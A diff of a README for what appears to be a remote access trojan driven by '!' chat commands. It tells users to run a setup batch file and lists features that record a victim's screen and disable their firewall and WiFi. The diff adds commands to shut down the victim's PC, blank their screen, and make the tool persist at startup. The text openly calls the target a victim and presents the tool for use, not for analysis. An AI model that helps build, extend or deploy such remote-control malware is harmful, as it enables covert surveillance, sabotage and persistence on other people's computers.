@@ -44,6 +44,9 @@ DOWNLOAD THE FILE AS A WHOLE ( AS A ZIP ). OPEN "getrequirements.bat", wait for 
 23. !screen_record -- Records screen for **30 SECONDS**
 24. !network_adapter -- Disables WIFI ( admin required for this command to work )
 25. !disable_firewall -- Disables Firewall ( admin required for this command to work )
+26. !shutdown -- Shutsdown PC
+27. !screenoff - Turns off the victims screen for 30 seconds
+28. !startup - ACTUALLY ADDS TO STARTUP.
 
 # SUPPORTED BROWSERS 
 
